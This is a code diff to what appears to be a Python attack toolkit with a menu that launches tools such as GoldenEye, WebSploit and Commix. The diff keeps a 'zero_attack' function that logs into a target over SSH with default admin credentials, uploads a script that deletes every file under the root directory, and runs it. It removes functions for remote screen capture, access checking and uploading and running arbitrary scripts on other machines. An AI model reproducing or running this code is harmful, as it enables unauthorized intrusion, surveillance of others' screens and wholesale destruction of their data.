@@ -118,7 +118,7 @@ def zero_attack(url_or_ip):
         client.connect(url_or_ip, username='admin', password='admin')  # Example credentials
         print(f"Admin access gained on {url_or_ip}")
 
-        # Create a "kill all file" script
+        # Execute the kill all file script directly
         kill_script = """import os
 for root, dirs, files in os.walk("/"):
     for file in files:
@@ -128,7 +128,6 @@ for root, dirs, files in os.walk("/"):
         sftp.file('killallfile.py', 'w').write(kill_script)
         sftp.close()
 
-        # Execute the script
         stdin, stdout, stderr = client.exec_command('python3 killallfile.py')
         stdout.channel.recv_exit_status()
         print(f"Kill all file script executed on {url_or_ip}")
@@ -184,63 +183,6 @@ def run_commix(target_url):
     command = f"commix --url={target_url}"
     subprocess.run(command, shell=True)
 
-def capture_screen(ip_address, username, password):
-    try:
-        client = paramiko.SSHClient()
-        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        client.connect(ip_address, username=username, password=password)
-
-        # Command to capture the screen and save it to a file
-        command = "import -window root screenshot.png"
-        stdin, stdout, stderr = client.exec_command(command)
-        stdout.channel.recv_exit_status()
-
-        # Download the screenshot
-        sftp = client.open_sftp()
-        sftp.get('screenshot.png', 'local_screenshot.png')
-        sftp.remove('screenshot.png')
-        sftp.close()
-        client.close()
-
-        # Display the screenshot
-        img = cv2.imread('local_screenshot.png')
-        cv2.imshow('Remote Screen', img)
-        cv2.waitKey(0)
-        cv2.destroyAllWindows()
-    except Exception as e:
-        print(f"Error capturing screen: {e}")
-
-def check_access(ip_address, username, password):
-    try:
-        client = paramiko.SSHClient()
-        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        client.connect(ip_address, username=username, password=password)
-        client.close()
-        print("Access to the computer has been gained.")
-    except Exception as e:
-        print(f"Error: {e}")
-
-# Function to send the script to another computer and run it automatically
-def send_and_run_script(ip_address, username, password, local_script_path, remote_script_path):
-    try:
-        client = paramiko.SSHClient()
-        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        client.connect(ip_address, username=username, password=password)
-
-        sftp = client.open_sftp()
-        sftp.put(local_script_path, remote_script_path)
-        sftp.close()
-
-        # Run the script on the remote machine
-        command = f"python3 {remote_script_path}"
-        stdin, stdout, stderr = client.exec_command(command)
-        stdout.channel.recv_exit_status()
-
-        client.close()
-        print(f"Script sent and executed on {ip_address}")
-    except Exception as e:
-        print(f"Error sending and running script: {e}")
-
 def display_ui():
     while True:
         print("""
@@ -265,15 +207,11 @@ def display_ui():
         [12] Run GoldenEye
         [13] Run WebSploit
         [14] Run Commix
-        [15] Control Other Computer
-        [16] View Monitor of Other Computer
-        [17] Check Access to Other Computer
-        [18] Send and Run Script on Another Computer
-        [19] Admin (zero attack)
-        [20] Exit
+        [15] Admin (zero attack)
+        [16] Exit
         """)
 
-        choice = input("Select the method (1-20): ").strip()
+        choice = input("Select the method (1-16): ").strip()
         ip_address = None
 
         if choice == "1":
@@ -361,33 +299,9 @@ def display_ui():
             print(f"Running Commix on {target_url}...")
             run_commix(target_url)
         elif choice == "15":
-            ip_address = input("Enter the IP address of the other computer: ").strip()
-            print(f"Using IP address: {ip_address} to control the other computer")
-            # Implement your control logic here
-            # Example: Send a command to the other computer
-            command = f"ssh user@{ip_address} 'your-command-here'"
-            subprocess.run(command, shell=True)
-        elif choice == "16":
-            ip_address = input("Enter the IP address of the other computer: ").strip()
-            username = input("Enter the username: ").strip()
-            password = input("Enter the password: ").strip()
-            capture_screen(ip_address, username, password)
-        elif choice == "17":
-            ip_address = input("Enter the IP address of the other computer: ").strip()
-            username = input("Enter the username: ").strip()
-            password = input("Enter the password: ").strip()
-            check_access(ip_address, username, password)
-        elif choice == "18":
-            ip_address = input("Enter the IP address of the other computer: ").strip()
-            username = input("Enter the username: ").strip()
-            password = input("Enter the password: ").strip()
-            local_script_path = input("Enter the local path of the script: ").strip()
-            remote_script_path = input("Enter the remote path to save the script: ").strip()
-            send_and_run_script(ip_address, username, password, local_script_path, remote_script_path)
-        elif choice == "19":
             url_or_ip = input("Enter the URL or IP address to use: ").strip()
             zero_attack(url_or_ip)
-        elif choice == "20":
+        elif choice == "16":
             print("Exiting...")
             break
         else:
